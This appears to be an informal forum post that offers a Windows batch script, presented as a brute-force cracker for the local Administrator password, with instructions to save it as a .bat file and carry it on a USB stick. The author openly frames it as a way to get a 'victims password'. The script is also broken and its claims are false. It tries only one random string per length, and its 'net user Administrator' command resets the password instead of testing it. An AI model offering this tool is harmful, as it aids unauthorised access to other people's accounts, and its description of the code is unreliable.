if your pass is bigger than 16
i suggest using this file, actually
i would suggest this file either way.
You see when the password cracker activates
it needs a max length for password since
then it would make one possible outcome
infinate, its saves possible outcomes in a temporary
file it deletes after password cracking
is done, and if you set max pass length
to something like 100 it would crash
the pc making possible passwords,
but here you can set the max pass length
to exactly what you need so no extra
proccesing is used up, just go to where
it says "set MAXLEN=16" and replace
16 with the length of your
password (or you victims password)
and then this will be perfect for you!
(set the value to 1000 if you wanna 
crash you pc forever:\)

how to set up:
after you've set the max length value
just open notepad, paste this in
(obviuosly just the code) and go to
"save as" and name it "[anymane you want].bat"
and then get it onto a usb and you're
good to go!

code:

@echo off
setlocal EnableDelayedExpansion

REM Define the characters to use in the password
set CHARS=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

REM Define the maximum length of the password
set MAXLEN=16

REM Generate a list of all possible passwords
for /L %%n in (1,1,%MAXLEN%) do (
  set "COMBINATION="
  for /L %%i in (1,1,%%n) do (
    set /a "INDEX=!random! %% 62"
    set "COMBINATION=!COMBINATION!!CHARS:~!INDEX!,1!"
  )
  echo !COMBINATION!>>passwords_to_try.txt
)

REM Try each password in the list
for /F "tokens=*" %%p in (passwords_to_try.txt) do (
  echo Trying password: %%p
  net user Administrator %%p >nul 2>&1
  if not errorlevel 1 (
    echo Password found, this will also be in a text file (found_password.txt): %%p
    echo %%p>>found_password.txt
    goto :done
  )
)

:done
echo Password brute-forcing complete.

REM Delete the passwords_to_try.txt file
del passwords_to_try.txt
